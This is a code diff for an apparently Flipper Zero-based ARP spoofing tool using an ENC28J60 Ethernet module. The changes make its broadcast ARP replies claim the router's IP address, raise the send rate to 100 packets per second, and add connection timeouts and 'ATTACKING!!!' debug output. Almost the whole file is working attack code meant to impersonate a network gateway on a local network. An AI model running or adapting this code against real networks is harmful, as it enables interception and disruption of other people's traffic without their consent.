@@ -5,7 +5,7 @@
 #include "libraries/protocol_tools/arp.h"
 #include "libraries/protocol_tools/ethernet_protocol.h"
 
-#define DEBUG_FILE 0
+#define DEBUG_FILE true
 
 // Instance for the ENC28j60
 enc28j60_t* enc = NULL;
@@ -22,7 +22,7 @@ uint8_t router_ip[4] = {192, 168, 0, 1};
 uint8_t ip_to_all[4] = {0xff, 0xff, 0xff, 0xff};
 
 // Packets sent per second
-uint8_t packet_rate = 20;
+uint8_t packet_rate = 100;
 
 // Just to help to see the IP
 void show_ip(uint8_t* data) {
@@ -39,7 +39,7 @@ void set_arp_message(uint8_t* buffer, uint16_t* len) {
     set_ethernet_header(buffer, MAC, MAC_ALL, 0x806);
 
     // For the ArpSpoofing we need to send this continuosly
-    arp_set_header_ipv4(buffer + ETHERNET_HEADER_LEN, MAC, MAC_ALL, my_ip, ip_to_all, 0x0002);
+    arp_set_header_ipv4(buffer + ETHERNET_HEADER_LEN, MAC, MAC_ALL, router_ip, ip_to_all, 0x0002);
 
     // Set the length of the message
     *len = ETHERNET_HEADER_LEN + ARP_LEN;
@@ -53,6 +53,11 @@ void send_arp_spoofing(uint8_t* buffer, uint16_t len) {
 
     if((furi_get_tick()) > (prev_time + (1000 / packet_rate))) {
         send_packet(enc, buffer, len);
+
+        #if DEBUG_FILE
+        printf("ATTACKING!!!\n");
+        #endif
+
         prev_time = furi_get_tick();
     }
 }
@@ -61,10 +66,18 @@ void send_arp_spoofing(uint8_t* buffer, uint16_t len) {
  * Function to get the connection
  */
 bool connection() {
-    if(!process_dora(enc, my_ip, router_ip)) return false;
+
+    uint32_t prev_time = furi_get_tick();
+
+    while (!process_dora(enc, my_ip, router_ip))
+    {
+        if(furi_get_tick()>(prev_time+5000)) return false;
+    }
 
 #if DEBUG_FILE
+    printf("MY IP: \n");
     show_ip(my_ip);
+    printf("ROUTER IP: \n");
     show_ip(router_ip);
 #endif
 
@@ -82,12 +95,19 @@ int app_main(void* p) {
 
     UNUSED(lenght);
 
+    bool start = false;
+
     enc = enc28j60_alloc(MAC);
-    enc28j60_start(enc);
+    if(enc28j60_start(enc)!=0xff){
+
+        #if DEBUG_FILE
+        printf("Chip conectado\n");
+        #endif
+
+        start = connection();
+    }
 
     set_arp_message(buffer, &lenght);
-
-    bool start = connection();
 
     bool attack = false;
 
@@ -108,7 +128,7 @@ int app_main(void* p) {
             furi_delay_ms(200);
         }
 
-        if(attack) send_arp_spoofing(buffer, lenght);
+        if(attack && is_link_up(enc)) send_arp_spoofing(buffer, lenght);
 
         furi_delay_ms(1);
     }
